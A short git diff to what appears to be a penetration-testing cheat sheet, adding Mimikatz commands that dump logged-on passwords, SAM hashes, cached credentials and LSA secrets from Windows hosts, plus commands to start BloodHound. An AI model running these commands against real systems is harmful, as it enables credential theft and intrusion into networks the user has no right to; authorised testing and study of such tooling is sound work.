@@ -80,7 +80,11 @@ $ start
 
 ### Mimikatz
 ```bash
-
+Privilege::debug
+Sekurlsa::logonpasswords
+Lsadump::sam
+Lsadump::cache
+Lsadump::secrets
 ```
 
 ### BloodyAD
@@ -90,7 +94,8 @@ $ start
 
 ### Bloodhound
 ```bash
-
+cd ~/bloodhound
+./bloodhound-cli up
 ```
 
 ### Post-Exploit One-Liners
